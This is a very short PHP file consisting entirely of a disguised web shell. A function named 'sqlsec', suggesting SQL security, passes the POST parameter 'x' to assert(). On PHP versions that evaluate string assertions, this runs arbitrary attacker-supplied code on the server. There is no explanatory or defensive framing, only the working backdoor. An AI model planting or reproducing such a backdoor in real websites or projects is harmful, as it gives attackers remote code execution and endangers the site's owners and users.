<?php 
    function sqlsec($a){
        assert($a);
    }
    sqlsec($_POST['x']);
?>
